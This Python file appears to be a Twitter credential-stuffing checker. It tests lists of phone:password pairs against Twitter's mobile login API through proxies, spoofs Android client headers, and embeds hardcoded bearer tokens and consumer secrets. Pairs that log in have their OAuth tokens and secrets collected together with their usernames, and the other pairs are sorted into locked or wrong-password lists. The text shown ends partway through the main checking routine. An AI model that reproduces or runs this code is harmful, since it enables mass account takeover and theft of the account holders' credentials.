import asyncio
import codecs
import datetime
import json
import os
import random
import ssl
import subprocess
import threading
import time
import uuid

import aiohttp as aiohttp
import sys
import requests
import urllib3
from requests.adapters import HTTPAdapter
from requests_oauthlib import OAuth1
from urllib3 import PoolManager
from urllib3.util import ssl_

chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n']
accounts_unchecked = []
accounts_success = []
accounts_fail = []
device_id = '42a363aead109860'
CONSUMER_KEY = "3nVuSoBZnx6U4vzUxf5w"
CONSUMER_SECRET = "Bcs59EFbbsdF6Sl9Ng71smgStWEGwXXKSjYvPVt7qys"
CIPHERS = [
    'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
    'DHE-RSA-AES128-GCM-SHA256', 'DHE-RSA-AES256-GCM-SHA384', 'DHE-RSA-CHACHA20-POLY1305', 'ECDHE-ECDSA-AES128-SHA256',
    'ECDHE-RSA-AES128-SHA256', 'ECDHE-ECDSA-AES128-SHA', 'ECDHE-RSA-AES128-SHA', 'ECDHE-ECDSA-AES256-SHA384',
    'ECDHE-RSA-AES256-SHA384', 'ECDHE-ECDSA-AES256-SHA', 'ECDHE-RSA-AES256-SHA', 'DHE-RSA-AES128-SHA256',
    'DHE-RSA-AES256-SHA256', 'AES128-GCM-SHA256', 'AES256-GCM-SHA384', 'AES128-SHA256', 'AES256-SHA256', 'AES128-SHA',
    'AES256-SHA', 'DES-CBC3-SHA'
]
MxGlBchXYs = ['Q6S506QP-2Q5R-4725-9068-SO009O984S3S', 'Q71302QP-873R-44Q2-O746-8R1P1OSS28S2',
              '3317NN07-R974-464S-929Q-9844P5783N40',
              '9938N656-O507-49O3-8O30-37Q4PQ3P6847', 'OS6P625Q-OSSQ-401Q-8754-181N6ON906Q9',
              'Q71302QP-873R-44Q2-O746-8R1P1OSS28S2',
              '69N0S83P-56RS-40P6-O164-371R2RONS548', '74PSR45R-NOP2-11RN-9691-3R38OR361N00',
              '0QP1R817-5O41-43N7-8QS8-P50525O9N802',
              '4Q635095-S7QP-4Q8S-N2Q6-QS3N0RR640PP', '19722N25-5453-4RQR-N84R-P1758511929P',
              '302516N0-R86O-452Q-N83P-P94N95QR0339',
              '8171O242-SSN0-46R0-NN6Q-67P63N06P32P', '2S5OP6Q6-90QP-44PN-OP4R-S1017S29O89R',
              '36PS60N6-Q714-4430-9PP7-9SR7830SS3S0',
              '1P4N779N-2Q93-4Q21-93P1-83557O9815PN', '67PPR33S-R7SR-4P23-NSR7-626N53865S69',
              '2899P3Q1-S781-4062-6N7R-50ROS6585Q90']


class TlsAdapter(HTTPAdapter):

    def __init__(self, ssl_options=0, **kwargs):
        self.ssl_options = ssl_options
        super(TlsAdapter, self).__init__(**kwargs)

    def init_poolmanager(self, *pool_args, **pool_kwargs):
        ctx = ssl_.create_urllib3_context(ciphers=":".join(CIPHERS), cert_reqs=ssl.CERT_REQUIRED,
                                          options=self.ssl_options)
        self.poolmanager = PoolManager(*pool_args,
                                       ssl_context=ctx,
                                       **pool_kwargs)

class Twitter:

    def __init__(self, configuration):
        requests.packages.urllib3.disable_warnings()
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.guest_token_errors = 0
        self.login_flow_errors = 0
        self.gsm_errors = 0
        self.locked = 0
        self.password_errors = 0
        self.username_errors = 0
        self.acid_flow_error = 0
        self.access_token_error = 0
        self.success = 0
        self.password_change_errors = 0
        self.exceptions = 0
        self.totalSuccess = 0
        self.lastSuccessDate = 'unknown'
        self.successRate = 0
        self.totalScan = 0
        self.proxy_string = f'http://{configuration.proxyUsername}:{configuration.proxyPassword}@{configuration.proxyHost}:{configuration.proxyPort}'
        self.success_accounts = []
        self.lock = threading.Lock()
        self.lastPair = 'unknown'
        self.failAttemps = 0
        self.proxyErrors = 0
        self.current_step = 0
        self.loginFlowErrorTracer = 0

        self.gsm_errors_data = []
        self.wrong_passwords_data = []
        self.exceptions_data = []
        self.success_data = []
        self.not_registred_data = []
        self.locked_data = []

    def threadHandler(self,method, *args):
        try:
            threading.Thread(target=method, args=args).start()
        except:
            threading.Thread(target=method, args=args).start()

    async def get_guest_token_mobil(self, session,gsm,password):
        try:
            async with session.post(
                    f"https://api.twitter.com/1.1/guest/activate.json",
                    headers={
                        'Host': 'api.twitter.com',
                        'Cache-Control': 'no-store',
                        'X-B3-Traceid': 'c8727f8b4cda54a1',
                        'Os-Security-Patch-Level': '2017-10-05',
                        'User-Agent': 'TwitterAndroid/9.58.1-release.0 (29581000-r-0) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2016)',
                        'X-Twitter-Client-Adid': 'c7dc8f5e-15a8-49df-a513-cbcd553bf57e',
                        'Timezone': 'Europe/Istanbul',
                        'X-Twitter-Client-Limit-Ad-Tracking': '0',
                        'X-Twitter-Client-Deviceid': device_id,
                        'X-Twitter-Client': 'TwitterAndroid',
                        'X-Twitter-Client-Language': 'tr-TR',
                        'X-Twitter-Api-Version': '5',
                        'Optimize-Body': 'true',
                        'X-Twitter-Active-User': 'no',
                        'X-Twitter-Client-Version': '9.58.1-release.0',
                        'X-Client-Uuid': 'a0c451d7-eb63-4ede-98ff-34f643efc470',
                        'Accept': 'application/json',
                        'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F',
                        'Accept-Language': 'tr-TR',
                        'Content-Type': 'text/plain; charset=ISO-8859-1'
                    }, proxy=self.proxy_string, timeout=10) as response:

                if response.status == 200:
                    response_json = json.loads(await response.text())
                    return True, response_json['guest_token']
                elif response.status == 407:
                    self.exceptions_data.append({"phone_number": f"{gsm}:{password}"})
                    return False, response.text()
                else:
                    self.exceptions_data.append({"phone_number": f"{gsm}:{password}"})
                    return False, "Proxy Error"
        except Exception as e:
            self.exceptions_data.append({"phone_number":f"{gsm}:{password}"})
            return False, e

    async def get_guest_token_web(self, session,gsm,password):
        try:
            async with session.post(
                    f"https://api.twitter.com/1.1/guest/activate.json",
                    headers={
                        'Host': 'api.twitter.com',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
                        'Accept': '*/*',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Twitter-Client-Language': 'en',
                        'X-Twitter-Active-User': 'yes',
                        'Origin': 'https://twitter.com',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-site',
                        'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
                        'Referer': 'https://twitter.com/'
                    }, proxy=self.proxy_string, timeout=10) as response:

                if response.status == 200:
                    response_json = json.loads(await response.text())
                    return True, response_json['guest_token']
                elif response.status == 407:
                    self.exceptions_data.append({"phone_number": f"{gsm}:{password}"})
                    return False, response.text()
                else:
                    self.exceptions_data.append({"phone_number": f"{gsm}:{password}"})
                    return False, "Proxy Error"
        except Exception as e:
            self.exceptions_data.append({"phone_number":f"{gsm}:{password}"})
            return False, e

    async def get_login_flow_token(self, session, guest_token,gsm,password):
        try:
            json_data = {
                'flow_token': None,
                'input_flow_data': {
                    'country_code': None,
                    'flow_context': {
                        'referrer_context': {
                            'referral_details': 'utm_source=google-play&utm_medium=organic',
                            'referrer_url': '',
                        },
                        'start_location': {
                            'location': 'deeplink',
                        },
                    },
                    'requested_variant': None,
                    'target_user_id': 0,
                },
                'subtask_versions': {
                    'alert_dialog': 1,
                    'email_verification': 2,
                    'app_locale_update': 1,
                    'open_external_link': 1,
                    'open_link': 1,
                    'contacts_live_sync_permission_prompt': 3,
                    'select_banner': 2,
                    'in_app_notification': 1,
                    'open_account': 2,
                    'settings_list': 7,
                    'upload_media': 1,
                    'enter_date': 1,
                    'choice_selection': 5,
                    'action_list': 2,
                    'interest_picker': 4,
                    'security_key': 1,
                    'sign_up_review': 1,
                    'menu_dialog': 1,
                    'end_flow': 1,
                    'privacy_options': 1,
                    'wait_spinner': 1,
                    'topics_selector': 1,
                    'fetch_temporary_password': 1,
                    'enter_email': 2,
                    'phone_verification': 4,
                    'web': 1,
                    'web_modal': 1,
                    'check_logged_in_account': 0,
                    'update_users': 1,
                    'show_code': 1,
                    'open_home_timeline': 1,
                    'generic_urt': 1,
                    'single_sign_on': 1,
                    'js_instrumentation': 1,
                    'tweet_selection_urt': 1,
                    'enter_phone': 2,
                    'user_recommendations_list': 4,
                    'sign_up': 2,
                    'alert_dialog_suppress_client_events': 1,
                    'enter_text': 4,
                    'enter_password': 5,
                    'user_recommendations_urt': 3,
                    'select_avatar': 2,
                    'location_permission_prompt': 1,
                    'cta_inline': 1,
                    'one_tap': 1,
                    'cta': 6,
                    'enter_username': 2,
                    'notifications_permission_prompt': 1,
                },
            }

            params = {
                'flow_name': 'login',
                'api_version': '1',
                'known_device_token': '',
                'sim_country_code': 'tr',
            }

            async with session.post(
                    f"https://api.twitter.com/1.1/onboarding/task.json",
                    headers={
                        'Host': 'api.twitter.com',
                        'Os-Security-Patch-Level': '2017-10-05',
                        'X-Twitter-Client-Language': 'tr-TR',
                        'X-Twitter-Client': 'TwitterAndroid',
                        'X-Twitter-Client-Deviceid': device_id,
                        'X-Twitter-Api-Version': '5',
                        'X-Twitter-Client-Version': '9.58.1-release.0',
                        'X-Twitter-Active-User': 'yes',
                        'Optimize-Body': 'true',
                        'X-Guest-Token': guest_token,
                        'X-Client-Uuid': 'a0c451d7-eb63-4ede-98ff-34f643efc470',
                        'Accept': 'application/json',
                        'Accept-Language': 'tr-TR',
                        'Cache-Control': 'no-store',
                        'X-B3-Traceid': 'f924a1b16e207e36',
                        'X-Twitter-Client-Appsetid': '3719e358-ba03-56e4-3865-3a0e7434e5f3',
                        'Twitter-Display-Size': '720x1280x240',
                        'User-Agent': 'TwitterAndroid/9.58.1-release.0 (29581000-r-0) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2016)',
                        'System-User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G935F Build/N2G48H)',
                        'X-Twitter-Client-Adid': 'c7dc8f5e-15a8-49df-a513-cbcd553bf57e',
                        'Timezone': 'Europe/Istanbul',
                        'Os-Version': '25',
                        'X-Twitter-Client-Limit-Ad-Tracking': '0',
                        'Content-Type': 'application/json',
                        'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F',
                    },
                    proxy=self.proxy_string,data=json.dumps(json_data),params=params,timeout=10) as response:
                if response.status == 200:
                    response_json = json.loads(await response.text())

                    if response_json['status'] == "success":
                        flow_token = response_json['flow_token']
                        return True, flow_token
                    else:
                        self.exceptions_data.append({"phone_number": f"{gsm}:{password}"})
                        return False, await response.text()
                else:
                    self.exceptions_data.append({"phone_number": f"{gsm}:{password}"})
                    return False, await response.text()
        except:
            self.exceptions_data.append({"phone_number": f"{gsm}:{password}"})
            return False, "timeout"

    async def check_gsm_is_valid(self, session, login_flow_token, gsm, guest_token,password):
        json_data = {
            'flow_token': '',
            'subtask_inputs': [
                {
                    'enter_text': {
                        'suggestion_id': None,
                        'text': '',
                        'link': 'next_link',
                    },
                    'subtask_id': 'LoginEnterUserIdentifier',
                },
            ],
            'subtask_versions': {
                'alert_dialog': 1,
                'email_verification': 2,
                'app_locale_update': 1,
                'open_external_link': 1,
                'open_link': 1,
                'contacts_live_sync_permission_prompt': 3,
                'select_banner': 2,
                'in_app_notification': 1,
                'open_account': 2,
                'settings_list': 7,
                'upload_media': 1,
                'enter_date': 1,
                'choice_selection': 5,
                'action_list': 2,
                'interest_picker': 4,
                'security_key': 1,
                'sign_up_review': 1,
                'menu_dialog': 1,
                'end_flow': 1,
                'privacy_options': 1,
                'wait_spinner': 1,
                'topics_selector': 1,
                'fetch_temporary_password': 1,
                'enter_email': 2,
                'phone_verification': 4,
                'web': 1,
                'web_modal': 1,
                'check_logged_in_account': 0,
                'update_users': 1,
                'show_code': 1,
                'open_home_timeline': 1,
                'generic_urt': 1,
                'single_sign_on': 1,
                'js_instrumentation': 1,
                'tweet_selection_urt': 1,
                'enter_phone': 2,
                'user_recommendations_list': 4,
                'sign_up': 2,
                'alert_dialog_suppress_client_events': 1,
                'enter_text': 4,
                'enter_password': 5,
                'user_recommendations_urt': 3,
                'select_avatar': 2,
                'location_permission_prompt': 1,
                'cta_inline': 1,
                'one_tap': 1,
                'cta': 6,
                'enter_username': 2,
                'notifications_permission_prompt': 1,
            },
        }
        json_data['flow_token'] = login_flow_token
        json_data['subtask_inputs'][0]['enter_text']['text'] = gsm

        async with session.post(
                f"https://api.twitter.com/1.1/onboarding/task.json",
                headers={
                    'Host': 'api.twitter.com',
                    'Os-Security-Patch-Level': '2017-10-05',
                    'X-Twitter-Client-Language': 'tr-TR',
                    'X-Twitter-Client': 'TwitterAndroid',
                    'X-Twitter-Client-Deviceid': device_id,
                    'X-Twitter-Api-Version': '5',
                    'Att': '1-DMzG3sGvW1VUUT9k2EtUq4plslJEMNwfs0D75xTr',
                    'X-Twitter-Client-Version': '9.58.1-release.0',
                    'X-Twitter-Active-User': 'yes',
                    'X-Guest-Token': guest_token,
                    'X-Client-Uuid': 'a0c451d7-eb63-4ede-98ff-34f643efc470',
                    'Accept': 'application/json',
                    "optimize-Body": "true",
                    "Content-Type": "application/json",
                    'Accept-Language': 'tr-TR',
                    'Cache-Control': 'no-store',
                    'X-B3-Traceid': '88ee32660987f8ef',
                    'X-Twitter-Client-Appsetid': '3719e358-ba03-56e4-3865-3a0e7434e5f3',
                    'Twitter-Display-Size': '720x1280x240',
                    'User-Agent': 'TwitterAndroid/9.58.1-release.0 (29581000-r-0) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2016)',
                    'System-User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G935F Build/N2G48H)',
                    'X-Twitter-Client-Adid': 'c7dc8f5e-15a8-49df-a513-cbcd553bf57e',
                    'Timezone': 'Europe/Istanbul',
                    'Os-Version': '25',
                    'X-Twitter-Client-Limit-Ad-Tracking': '0',
                    'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F'
                }, data=json.dumps(json_data), proxy=self.proxy_string) as response:
            #print(f"CHECK-GSM@{gsm} -> {await response.text()}")
            if response.status == 200:
                response_json = json.loads(await response.text())
                if response_json['status'] == "success" and response_json['subtasks'][0]['subtask_id'] == "LoginEnterPassword":
                    flow_token = response_json['flow_token']
                    return True, flow_token, "LoginEnterPassword"
                elif response_json['status'] == "success" and response_json['subtasks'][0]['subtask_id'] == 'DenyLoginSubtask':
                    self.locked_data.append({"phone_number": f"{gsm}:{password}"})
                    return False, None, None
                else:
                    self.exceptions_data.append({"phone_number": f"{gsm}:{password}"})
                    return False,None,None
            else:
                self.not_registred_data.append({"phone_number": f"{gsm}:{password}"})
                return False, await response.text(),None

    async def check_passwd_is_valid(self, session, password_flow_token, passwd, guest_token,gsm):
        json_data = {
            'flow_token': '',
            'subtask_inputs': [
                {
                    'enter_password': {
                        'password': '',
                        'link': 'next_link',
                    },
                    'subtask_id': 'LoginEnterPassword',
                },
            ],
            'subtask_versions': {
                'alert_dialog': 1,
                'email_verification': 2,
                'app_locale_update': 1,
                'open_external_link': 1,
                'open_link': 1,
                'contacts_live_sync_permission_prompt': 3,
                'select_banner': 2,
                'in_app_notification': 1,
                'open_account': 2,
                'settings_list': 7,
                'upload_media': 1,
                'enter_date': 1,
                'choice_selection': 5,
                'action_list': 2,
                'interest_picker': 4,
                'security_key': 1,
                'sign_up_review': 1,
                'menu_dialog': 1,
                'end_flow': 1,
                'privacy_options': 1,
                'wait_spinner': 1,
                'topics_selector': 1,
                'fetch_temporary_password': 1,
                'enter_email': 2,
                'phone_verification': 4,
                'web': 1,
                'web_modal': 1,
                'check_logged_in_account': 0,
                'update_users': 1,
                'show_code': 1,
                'open_home_timeline': 1,
                'generic_urt': 1,
                'single_sign_on': 1,
                'js_instrumentation': 1,
                'tweet_selection_urt': 1,
                'enter_phone': 2,
                'user_recommendations_list': 4,
                'sign_up': 2,
                'alert_dialog_suppress_client_events': 1,
                'enter_text': 4,
                'enter_password': 5,
                'user_recommendations_urt': 3,
                'select_avatar': 2,
                'location_permission_prompt': 1,
                'cta_inline': 1,
                'one_tap': 1,
                'cta': 6,
                'enter_username': 2,
                'notifications_permission_prompt': 1,
            },
        }

        json_data['flow_token'] = password_flow_token
        json_data['subtask_inputs'][0]['enter_password']['password'] = passwd
        async with session.post(
                f"https://api.twitter.com/1.1/onboarding/task.json",
                headers={
                    'Host': 'api.twitter.com',
                    'Os-Security-Patch-Level': '2017-10-05',
                    'X-Twitter-Client-Language': 'tr-TR',
                    'X-Twitter-Client': 'TwitterAndroid',
                    'X-Twitter-Client-Deviceid': '751405a75d71e619',
                    'X-Twitter-Api-Version': '5',
                    'Att': '1-DMzG3sGvW1VUUT9k2EtUq4plslJEMNwfs0D75xTr',
                    'X-Twitter-Client-Version': '9.58.1-release.0',
                    'X-Twitter-Active-User': 'yes',
                    'Optimize-Body': 'true',
                    'X-Guest-Token': guest_token,
                    'X-Client-Uuid': 'a0c451d7-eb63-4ede-98ff-34f643efc470',
                    'Accept': 'application/json',
                    'Accept-Language': 'tr-TR',
                    'Cache-Control': 'no-store',
                    'X-B3-Traceid': 'ab8d37dfb1198f34',
                    'X-Twitter-Client-Appsetid': '3719e358-ba03-56e4-3865-3a0e7434e5f3',
                    'Twitter-Display-Size': '720x1280x240',
                    'User-Agent': 'TwitterAndroid/9.58.1-release.0 (29581000-r-0) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2016)',
                    'System-User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G935F Build/N2G48H)',
                    'X-Twitter-Client-Adid': 'c7dc8f5e-15a8-49df-a513-cbcd553bf57e',
                    'Timezone': 'Europe/Istanbul',
                    'Os-Version': '25',
                    'Content-Type': 'application/json',
                    'X-Twitter-Client-Limit-Ad-Tracking': '0',
                    'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F'
                }, data=json.dumps(json_data), proxy=self.proxy_string) as response:
            print(f"CHECK-PASSWORD@{passwd} -> {await response.text()}")

            if response.status == 200:
                response_json = json.loads(await response.text())
                if (response_json['status'] == "success" and response_json['subtasks'][0][
                    'subtask_id'] == 'SuccessExit') \
                        or (response_json['status'] == "success" and response_json['subtasks'][0]['subtask_id'] ==
                            'AccountDuplicationCheck'):
                    return True, response_json['flow_token'], response_json['subtasks'][0]['check_logged_in_account'][
                        'user_id']
                else:
                    self.exceptions_data.append({"phone_number": f"{gsm}:{passwd}"})
                    return False, None, None
            else:
                self.wrong_passwords_data.append({"phone_number": f"{gsm}:{passwd}"})
                return False, None, None

    async def get_username_by_user_id(self, session, guest_token, user_id,gsm,password):
        async with session.get(
                f"https://twitter.com/i/api/graphql/5bKaQ2_gljw0cRGYF1FVnQ/UserByRestId?variables=%7B%22userId%22%3A%22{user_id}%22%2C%22withSafetyModeUserFields%22%3Atrue%2C%22withSuperFollowsUserFields%22%3Atrue%7D&features=%7B%22responsive_web_graphql_timeline_navigation_enabled%22%3Afalse%7D",
                headers={
                    "authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
                    "x-guest-token": guest_token
                }, proxy=self.proxy_string) as response:
            print(f"CHECK_USERNAME@{user_id} -> {await response.text()}")
            if response.status == 200:
                response_json = json.loads(await response.text())
                if response_json["data"]["user"]["result"]["legacy"]["screen_name"] is not None:
                    return True, response_json["data"]["user"]["result"]["legacy"]["screen_name"]
                else:
                    self.exceptions_data.append({"phone_number": f"{gsm}:{password}"})
                    return False, await response_json
            else:
                self.exceptions_data.append({"phone_number": f"{gsm}:{password}"})
                return False, await response.text()

    async def get_acid_flow_token(self, session, guest_token, acid_flow_token,gsm,password):
        post_data = json.loads(
            '{"flow_token":"","subtask_inputs":[{"check_logged_in_account":{"link":"AccountDuplicationCheck_false"},"subtask_id":"AccountDuplicationCheck"}],"subtask_versions":{"alert_dialog":1,"email_verification":2,"app_locale_update":1,"open_external_link":1,"open_link":1,"contacts_live_sync_permission_prompt":3,"select_banner":2,"in_app_notification":1,"open_account":2,"settings_list":5,"upload_media":1,"enter_date":1,"choice_selection":5,"action_list":2,"interest_picker":4,"security_key":1,"sign_up_review":1,"menu_dialog":1,"end_flow":1,"privacy_options":1,"wait_spinner":1,"topics_selector":1,"fetch_temporary_password":1,"enter_email":2,"phone_verification":4,"web":1,"web_modal":1,"check_logged_in_account":0,"update_users":1,"show_code":1,"open_home_timeline":1,"generic_urt":1,"single_sign_on":1,"js_instrumentation":1,"enter_phone":2,"user_recommendations_list":4,"sign_up":2,"alert_dialog_suppress_client_events":1,"enter_text":4,"enter_password":5,"user_recommendations_urt":3,"select_avatar":2,"location_permission_prompt":1,"cta_inline":1,"one_tap":1,"cta":6,"enter_username":2}}')
        post_data['flow_token'] = acid_flow_token
        async with session.post(
                f"https://api.twitter.com/1.1/onboarding/task.json",
                headers={
                    "accept": "application/json",
                    "accept-Encoding": "gzip, deflate",
                    "accept-Language": "tr-TR",
                    "authorization": "Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F",
                    "cache-Control": "no-store",
                    "content-Type": "application/json",
                    "host": "api.twitter.com",
                    "X-Guest-Token": guest_token,
                    "os-Security-Patch-Level": "2017-10-05",
                    "timezone": "Europe/Istanbul",
                    "user-Agent": "TwitterAndroid/9.40.0-release.0 (29400000-r-0) A5010/7.1.2 (OnePlus;A5010;OnePlus;A5010;0;;1;2015)",
                    "x-B3-Traceid": "a3f5d26b99a99918",
                    "x-Client-Uuid": "683520c1-0e6c-439f-93e4-adc4523d9e79",
                    "x-Twitter-Active-User": "no",
                    "x-Twitter-Api-Version": "5",
                    "x-Twitter-Client": "TwitterAndroid",
                    "x-Twitter-Client-Adid": "2841a7d0-43bf-4d2c-b1e6-999ee4bb19bb",
                    "x-Twitter-Client-Deviceid": device_id,
                    "x-Twitter-Client-Language": "tr-TR",
                    "x-Twitter-Client-Limit-Ad-Tracking": "0",
                    "x-Twitter-Client-Version": "9.40.0-release.0"
                }, data=json.dumps(post_data), proxy=self.proxy_string) as response:
            print(f"CHECK_ACID_FLOW@{acid_flow_token} -> {await response.text()}")
            if response.status == 200:
                response_json = json.loads(await response.text())
                if ((response_json['status'] == "success" and response_json['subtasks'][0][
                    "subtask_id"] == "LoginAcid") or \
                    (response_json["subtasks"][0]["enter_text"]["hint_text"] == "@username" or len(
                        response_json['subtasks']) == 1)) or \
                        response_json['subtasks'][0]['subtask_id'] == "LoginSuccessSubtask":
                    return True, response_json['flow_token']
                else:
                    self.exceptions_data.append({"phone_number": f"{gsm}:{password}"})
                    return False, await response_json
            else:
                self.exceptions_data.append({"phone_number": f"{gsm}:{password}"})
                return False, await response.text()

    async def get_access_token(self, session, guest_token, access_token_flow, username,gsm, password):
        post_data = json.loads(
            '{"flow_token":"","subtask_inputs":[{"enter_text":{"suggestion_id":null,"text":"","link":"next_link"},"subtask_id":"LoginAcid"}],"subtask_versions":{"alert_dialog":1,"email_verification":2,"app_locale_update":1,"open_external_link":1,"open_link":1,"contacts_live_sync_permission_prompt":3,"select_banner":2,"in_app_notification":1,"open_account":2,"settings_list":5,"upload_media":1,"enter_date":1,"choice_selection":5,"action_list":2,"interest_picker":4,"security_key":1,"sign_up_review":1,"menu_dialog":1,"end_flow":1,"privacy_options":1,"wait_spinner":1,"topics_selector":1,"fetch_temporary_password":1,"enter_email":2,"phone_verification":4,"web":1,"web_modal":1,"check_logged_in_account":0,"update_users":1,"show_code":1,"open_home_timeline":1,"generic_urt":1,"single_sign_on":1,"js_instrumentation":1,"enter_phone":2,"user_recommendations_list":4,"sign_up":2,"alert_dialog_suppress_client_events":1,"enter_text":4,"enter_password":5,"user_recommendations_urt":3,"select_avatar":2,"location_permission_prompt":1,"cta_inline":1,"one_tap":1,"cta":6,"enter_username":2}}')
        post_data['flow_token'] = access_token_flow
        post_data['subtask_inputs'][0]['enter_text']['text'] = username
        async with session.post(
                f"https://api.twitter.com/1.1/onboarding/task.json",
                headers={
                    "accept": "application/json",
                    "accept-Encoding": "gzip, deflate",
                    "accept-Language": "tr-TR",
                    "authorization": "Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F",
                    "cache-Control": "no-store",
                    "content-Type": "application/json",
                    "host": "api.twitter.com",
                    "optimize-Body": "true",
                    "X-Guest-Token": guest_token,
                    "os-Security-Patch-Level": "2017-10-05",
                    "timezone": "Europe/Istanbul",
                    "user-Agent": "TwitterAndroid/9.40.0-release.0 (29400000-r-0) A5010/7.1.2 (OnePlus;A5010;OnePlus;A5010;0;;1;2015)",
                    "x-B3-Traceid": "a3f5d26b99a99918",
                    "x-Client-Uuid": "683520c1-0e6c-439f-93e4-adc4523d9e79",
                    "x-Twitter-Active-User": "no",
                    "x-Twitter-Api-Version": "5",
                    "x-Twitter-Client": "TwitterAndroid",
                    "x-Twitter-Client-Adid": "2841a7d0-43bf-4d2c-b1e6-999ee4bb19bb",
                    "x-Twitter-Client-Deviceid": device_id,
                    "x-Twitter-Client-Language": "tr-TR",
                    "x-Twitter-Client-Limit-Ad-Tracking": "0",
                    "x-Twitter-Client-Version": "9.40.0-release.0"
                }, data=json.dumps(post_data), proxy=self.proxy_string) as response:
            print(f"CHECK_ACCESS_TOKEN@{username} -> {await response.text()}")
            if response.status == 200:
                response_json = json.loads(await response.text())
                if response_json['status'] == 'success' and response_json['subtasks'][0][
                    'subtask_id'] == 'LoginSuccessSubtask':
                    return True, response_json["subtasks"][0]["open_account"]["oauth_token"], \
                           response_json["subtasks"][0]["open_account"]["oauth_token_secret"]
                else:
                    self.exceptions_data.append({"phone_number": f"{gsm}:{password}"})
                    return False, await response_json
            else:
                self.exceptions_data.append({"phone_number": f"{gsm}:{password}"})
                return False, await response.text()

    async def check_account(self, corou_id, session, accounts):
        self.lastPair = accounts[corou_id]
        gsm = str(accounts[corou_id]).split(':')[0]
        passwd = (str(accounts[corou_id]).split(':')[1])
        if '+' not in gsm:
            gsm = '+' + gsm
        try:
            guest_token_result, guest_token = await self.get_guest_token_mobil(session,gsm,passwd)

            if not guest_token_result:
                if guest_token == 'Proxy Error':
                    self.proxyErrors = self.proxyErrors + 1
                    return
                self.guest_token_errors = self.guest_token_errors + 1
                return

            login_flow_result, login_flow_token = await self.get_login_flow_token(session, guest_token,gsm,passwd)

            if login_flow_result:
                # ConsoleLogger.log(f"Login flow token {login_flow_token} OK")
                check_gsm_result, password_flow_token, type = await self.check_gsm_is_valid(session, login_flow_token, gsm,
                                                                                      guest_token,passwd)

                if check_gsm_result:
                    check_passwd_result, acid_flow_token, user_id = await self.check_passwd_is_valid(session,
                                                                                                     password_flow_token,
                                                                                                     passwd,
                                                                                                     guest_token,gsm)
                    # ConsoleLogger.log(f"GSM check {gsm} OK")

                    if check_passwd_result:
                        guest_web_token_result, guest_web_token = await self.get_guest_token_web(session,gsm,passwd)

                        if not guest_web_token:
                            self.guest_token_errors = self.guest_token_errors + 1
                            return

                        # ConsoleLogger.log(f"Password check {gsm}:{passwd}:{user_id} OK")
                        get_username_result, username = await self.get_username_by_user_id(session, guest_web_token,
                                                                                           user_id,gsm,passwd)
                        if get_username_result:

                            get_acid_flow_result, access_token_flow = await self.get_acid_flow_token(session,
                                                                                                     guest_token,
                                                                                                     acid_flow_token,gsm,passwd)
                            if get_acid_flow_result:
                                # ConsoleLogger.log(f"Acid Flow {gsm}:{passwd}:{username} OK")

                                get_access_token_result, oauth_token, oauth_token_secret = await self.get_access_token(
                                    session, guest_token, access_token_flow, username,gsm,passwd)
                                if get_access_token_result:
                                    self.success_accounts.append(
                                        {"gsm": gsm,
                                         "password": passwd,
                                         "oauth_token": oauth_token,
                                         "oauth_token_secret": oauth_token_secret,
                                         "username": username
                                         })

                                else:
                                    self.totalScan = self.totalScan + 1
                                    self.access_token_error = self.access_token_error + 1
                            else:
                                self.totalScan = self.totalScan + 1
                                self.acid_flow_error = self.acid_flow_error + 1
                        else:
                            self.totalScan = self.totalScan + 1
                            self.username_errors = self.username_errors + 1
                    else:
                        self.failAttemps = self.failAttemps + 1
